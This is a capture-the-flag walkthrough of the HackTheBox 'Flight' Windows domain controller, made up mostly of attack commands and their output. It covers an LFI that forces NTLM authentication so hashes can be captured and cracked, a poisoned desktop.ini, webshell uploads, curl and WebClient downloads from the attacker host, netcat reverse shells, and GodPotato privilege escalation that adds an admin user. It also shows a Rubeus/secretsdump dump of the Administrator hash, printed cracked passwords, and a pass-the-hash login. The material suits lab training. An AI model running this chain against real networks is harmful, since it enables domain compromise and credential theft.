
### Initial access
Port scan
```
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
80/tcp    open  http          syn-ack ttl 127 Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
|_http-title: g0 Aviation
| http-methods: 
|   Supported Methods: GET POST OPTIONS HEAD TRACE
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2026-09-24 06:50:11Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: flight.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: flight.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49673/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49693/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
57006/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: G0; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-09-24T06:51:07
|_  start_date: N/A
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 50845/tcp): CLEAN (Timeout)
|   Check 2 (port 15211/tcp): CLEAN (Timeout)
|   Check 3 (port 21917/udp): CLEAN (Timeout)
|   Check 4 (port 49078/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_clock-skew: 6h58m24s


```
subdomain scan
```bash
┌──(kali㉿kali)-[~/HTB/Flight]
└─$ ffuf -u http://$target -H "Host: FUZZ.flight.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fw 1546

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.228.120
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.flight.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 1546
________________________________________________

school                  [Status: 200, Size: 3996, Words: 1045, Lines: 91, Duration: 91ms]
:: Progress: [4989/4989] :: Job [1/1] :: 398 req/sec :: Duration: [0:00:12] :: Errors: 0 ::
                                                                                              
```
dirscan
filescan

This is sink point `view` to our lfi to capture hash
```
http://school.flight.htb/index.php?view=//10.10.17.47/C$/Windows/shares
```

We get hash and crack it
```bash {8}
┌──(kali㉿kali)-[~/HTB/Flight]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash

Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
S@Ss!K@*t13      (svc_apache)     
1g 0:00:00:02 DONE (2026-09-23 20:29) 0.4716g/s 5031Kp/s 5031Kc/s 5031KC/s SADSAM..Ryanelkins
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed. 

```

Get users
```
┌──(kali㉿kali)-[~/HTB/Flight]
└─$ impacket-GetADUsers -all flight.htb/svc_apache:'S@Ss!K@*t13' -dc-ip 10.129.228.120 | awk 'NR>5 {print $1}' > users.txt
                                                                                                                                                             
┌──(kali㉿kali)-[~/HTB/Flight]
└─$ cat users.txt 
Administrator
Guest
krbtgt
S.Moon
R.Cold
G.Lors
L.Kein
M.Gold
C.Bum
W.Walker
I.Francis
D.Truff
V.Stevens
svc_apache
O.Possum
```

We have user that use same cred
```
┌──(kali㉿kali)-[~/HTB/Flight]
└─$ nxc smb 10.129.228.120 -u users.txt -p 'S@Ss!K@*t13' --continue-on-success
SMB         10.129.228.120  445    G0               [*] Windows 10 / Server 2019 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False) 
SMB         10.129.228.120  445    G0               [-] flight.htb\Administrator:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.129.228.120  445    G0               [-] flight.htb\Guest:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.129.228.120  445    G0               [-] flight.htb\krbtgt:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.129.228.120  445    G0               [+] flight.htb\S.Moon:S@Ss!K@*t13 

```
Recon SMB
```bash
SMB         10.129.228.120  445    G0               Share           Permissions     Remark
SMB         10.129.228.120  445    G0               -----           -----------     ------
SMB         10.129.228.120  445    G0               ADMIN$                          Remote Admin
SMB         10.129.228.120  445    G0               C$                              Default share
SMB         10.129.228.120  445    G0               IPC$            READ            Remote IPC
SMB         10.129.228.120  445    G0               NETLOGON        READ            Logon server share 
SMB         10.129.228.120  445    G0               Shared          READ,WRITE      
SMB         10.129.228.120  445    G0               SYSVOL          READ            Logon server share 
SMB         10.129.228.120  445    G0               Users           READ            
SMB         10.129.228.120  445    G0               Web             READ  
```

Create artifact to get smb hash
```
┌──(kali㉿kali)-[~/HTB/Flight]
└─$ echo '[.ShellClassInfo]' > desktop.ini
echo 'IconResource=\\10.10.17.47\share\poison.ico,0' >> desktop.ini
                                                                     

# put desktop.ini
# ls
drw-rw-rw-          0  Thu Sep 24 03:50:31 2026 .
drw-rw-rw-          0  Thu Sep 24 03:50:31 2026 ..
-rw-rw-rw-         62  Thu Sep 24 03:50:32 2026 desktop.ini
# 

```
In responder we capture the hash
```
[SMB] NTLMv2-SSP Client   : 10.129.228.120
[SMB] NTLMv2-SSP Username : flight.htb\c.bum
[SMB] NTLMv2-SSP Hash     : c.bum::flight.htb:532f2b3c47956a94:B901C15F2A1ED0ABA18150FEC3AF7DDF:010100000000000000D3BCD09C4BDD01B3DA14E7BC8E13ED0000000002000800450058004900390001001E00570049004E002D00560052004400580042005200460055004D003800300004003400570049004E002D00560052004400580042005200460055004D00380030002E0045005800490039002E004C004F00430041004C000300140045005800490039002E004C004F00430041004C000500140045005800490039002E004C004F00430041004C000700080000D3BCD09C4BDD0106000400020000000800300030000000000000000000000000300000E0C789A8EE64CCBF45A4B4F01B99970C8D62CD60CEFA2F64951320ABBC0E4A9B0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310037002E00340037000000000000000000 
```

Crack it
```
┌──(kali㉿kali)-[~/HTB/Flight]
└─$ echo 'c.bum::flight.htb:532f2b3c47956a94:B901C15F2A1ED0ABA18150FEC3AF7DDF:010100000000000000D3BCD09C4BDD01B3DA14E7BC8E13ED0000000002000800450058004900390001001E00570049004E002D00560052004400580042005200460055004D003800300004003400570049004E002D00560052004400580042005200460055004D00380030002E0045005800490039002E004C004F00430041004C000300140045005800490039002E004C004F00430041004C000500140045005800490039002E004C004F00430041004C000700080000D3BCD09C4BDD0106000400020000000800300030000000000000000000000000300000E0C789A8EE64CCBF45A4B4F01B99970C8D62CD60CEFA2F64951320ABBC0E4A9B0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310037002E00340037000000000000000000' > cbum.hash
                                                                                                                                                             
┌──(kali㉿kali)-[~/HTB/Flight]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt cbum.hash 
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Tikkycoll_431012284 (c.bum)     
1g 0:00:00:02 DONE (2026-09-23 20:56) 0.4975g/s 5243Kp/s 5243Kc/s 5243KC/s TinyMutt69..Thehunter22
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed. 

```

Recon smb again and we have write permission in web folder with new cred
```
SMB         10.129.228.120  445    G0               Share           Permissions     Remark
SMB         10.129.228.120  445    G0               -----           -----------     ------
SMB         10.129.228.120  445    G0               ADMIN$                          Remote Admin
SMB         10.129.228.120  445    G0               C$                              Default share
SMB         10.129.228.120  445    G0               IPC$            READ            Remote IPC
SMB         10.129.228.120  445    G0               NETLOGON        READ            Logon server share 
SMB         10.129.228.120  445    G0               Shared          READ,WRITE      
SMB         10.129.228.120  445    G0               SYSVOL          READ            Logon server share 
SMB         10.129.228.120  445    G0               Users           READ            
SMB         10.129.228.120  445    G0               Web             READ,WRITE     
```

Put webshell in web dir but it we put it in root dir it will be delete we must put it in images folder
```
# pwd
/flight.htb/images

# put webshell.php
# ls
drw-rw-rw-          0  Thu Sep 24 04:03:25 2026 .
drw-rw-rw-          0  Thu Sep 24 04:03:25 2026 ..
-rw-rw-rw-       7952  Thu Sep 22 16:17:00 2022 bg_bot.jpg
-rw-rw-rw-        494  Thu Sep 22 16:17:00 2022 bg_box1.jpg
-rw-rw-rw-     162980  Thu Sep 22 16:17:00 2022 bg_img.jpg
-rw-rw-rw-      53945  Thu Sep 22 16:17:00 2022 bg_img2.jpg
-rw-rw-rw-       1526  Thu Sep 22 16:17:00 2022 bg_testimonials.gif
-rw-rw-rw-      11877  Thu Sep 22 16:17:00 2022 bg_top.jpg
-rw-rw-rw-        155  Thu Sep 22 16:17:00 2022 button1_bg.gif
-rw-rw-rw-        155  Thu Sep 22 16:17:00 2022 button2_bg.gif
-rw-rw-rw-       1839  Thu Sep 22 16:17:00 2022 button_top.jpg
-rw-rw-rw-       1827  Thu Sep 22 16:17:00 2022 button_top_active.jpg
-rw-rw-rw-        131  Thu Sep 22 16:17:00 2022 img1.gif
-rw-rw-rw-        119  Thu Sep 22 16:17:00 2022 img2.gif
-rw-rw-rw-         73  Thu Sep 22 16:17:00 2022 img3.gif
-rw-rw-rw-         67  Thu Sep 22 16:17:00 2022 line_top.gif
-rw-rw-rw-       7770  Thu Sep 22 16:17:00 2022 logo.jpg
-rw-rw-rw-        107  Thu Sep 22 16:17:00 2022 marker_1.gif
-rw-rw-rw-      20043  Thu Sep 22 16:17:00 2022 page2_img1.jpg
-rw-rw-rw-       8990  Thu Sep 22 16:17:00 2022 page2_img2.jpg
-rw-rw-rw-      15620  Thu Sep 22 16:17:00 2022 page3_img1.jpg
-rw-rw-rw-      14744  Thu Sep 22 16:17:00 2022 page3_img2.jpg
-rw-rw-rw-      14744  Thu Sep 22 16:17:00 2022 page4_img1.jpg
-rw-rw-rw-      10824  Thu Sep 22 16:17:00 2022 page4_img2.jpg
-rw-rw-rw-        348  Thu Sep 24 04:03:26 2026 webshell.php
# 

```

We have rev shell
```
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~/HTB/Flight]
└─$ rlwrap nc -lvnp 4444            
listening on [any] 4444 ...
connect to [10.10.17.47] from (UNKNOWN) [10.129.228.120] 64677

PS C:\xampp\htdocs\flight.htb\images> whoami
flight\svc_apache

```
### Lateral Movement
Get revsere shell using RunasCS
```
C:\Windows\system32>whoami
whoami
flight\c.bum


```
### Priv escalation
Run winpeas see some local port is open
```
  TCP        [::]                                        3268          [::]                                        0               Listening         648             lsass
  TCP        [::]                                        3269          [::]                                        0               Listening         648             lsass
  TCP        [::]                                        5985          [::]                                        0               Listening         4               System
  TCP        [::]                                        8000          [::]                                        0               Listening         4               System
  TCP        [::]                                        9389          [::]                                        0               Listening         2872 
```
We see the the weberver running local we can put webshell to it
```
C:\inetpub\development>curl  http://10.10.17.47/webshell.aspx -o webshell.aspx
curl  http://10.10.17.47/webshell.aspx -o webshell.aspx
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  5110  100  5110    0     0  18409      0 --:--:-- --:--:-- --:--:-- 18514

```

```
┌──(kali㉿kali)-[~/HTB/Flight]
└─$ rlwrap nc -lvnp 6666
listening on [any] 6666 ...
connect to [10.10.17.47] from (UNKNOWN) [10.129.228.120] 58532

PS C:\inetpub\development> whoami
iis apppool\defaultapppool
PS C:\inetpub\development> 


```


```

PS C:\temp> whoami /all

USER INFORMATION
----------------

User Name                  SID                                                          
========================== =============================================================
iis apppool\defaultapppool S-1-5-82-3006700770-424185619-1745488364-794895919-4004696415


GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes                                        
========================================== ================ ============ ==================================================
Mandatory Label\High Mandatory Level       Label            S-1-16-12288                                                   
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\SERVICE                       Well-known group S-1-5-6      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                              Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
BUILTIN\IIS_IUSRS                          Alias            S-1-5-32-568 Mandatory group, Enabled by default, Enabled group
LOCAL                                      Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
                                           Unknown SID type S-1-5-82-0   Mandatory group, Enabled by default, Enabled group


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeMachineAccountPrivilege     Add workstations to domain                Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
PS C:\temp> 

```

We have `SeImpersionate` let run `GodPotato`

```
PS C:\temp> PS C:\temp> (New-Object System.Net.WebClient).DownloadFile('http://10.10.17.47/GodPotato-NET4.exe', 'C:\temp\gp.exe')
PS C:\temp> ./gp.exe -cmd "cmd /c net user anh dcGvfwTbjV[] /add & net localgroup Administrators anh /add & net localgroup "Remote Management Users" anh /add"
PS C:\temp> net user

User accounts for \\G0

-------------------------------------------------------------------------------
Administrator            anh                      C.Bum                    
D.Truff                  G.Lors                   Guest                    
I.Francis                krbtgt                   L.Kein                   
M.Gold                   O.Possum                 R.Cold                   
S.Moon                   svc_apache               V.Stevens                
W.Walker                 
The command completed successfully.

```

Get root
```
┌──(kali㉿kali)-[~/HTB/Flight]
└─$ evil-winrm -i 10.129.228.120 -u 'anh' -p 'dcGvfwTbjV[]'
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\anh\Documents> cd ../../Administrator/deskotp
Cannot find path 'C:\Users\Administrator\deskotp' because it does not exist.
At line:1 char:1
+ cd ../../Administrator/deskotp
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (C:\Users\Administrator\deskotp:String) [Set-Location], ItemNotFoundException
    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.SetLocationCommand
*Evil-WinRM* PS C:\Users\anh\Documents> cd ../../Administrator/desktop
*Evil-WinRM* PS C:\Users\Administrator\desktop> ls


    Directory: C:\Users\Administrator\desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        9/23/2026  11:39 PM             34 root.txt


*Evil-WinRM* PS C:\Users\Administrator\desktop> cat root.txt
aa3c7cc23f2bf0cf8b4b40e6a99f0215
*Evil-WinRM* PS C:\Users\Administrator\desktop> 

```





Alternatie using Rubeus
Get ticket
```
PS C:\temp> hostname
g0
PS C:\temp> ./rub.exe tgtdeleg /nowarp

```

```

tr -d '[:space:]' > ticket.b64 << 'EOF'
  Rubeus output here    
EOF

cat ticket.b64 | base64 -d > ticket.kirbi
impacket-ticketConverter ticket.kirbi ticket.ccache
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/HTB/Flight]
└─$ KRB5CCNAME=ticket.ccache faketime "$(ntpdate -q 10.129.228.120 | tail -n 1 | awk '{print $1,$2,$3}')" impacket-secretsdump -k -no-pass g0.flight.htb -just-dc-user Administrator -target-ip 10.129.228.120
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:43bbfc530bab76141b12c8446e30c17c:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:08c3eb806e4a83cdc660a54970bf3f3043256638aea2b62c317feffb75d89322
Administrator:aes128-cts-hmac-sha1-96:735ebdcaa24aad6bf0dc154fcdcb9465
Administrator:des-cbc-md5:c7754cb5498c2a2f
[*] Cleaning up... 
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/HTB/Flight]
└─$ evil-winrm -i 10.129.228.120 -u Administrator -H 43bbfc530bab76141b12c8446e30c17c
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> 

```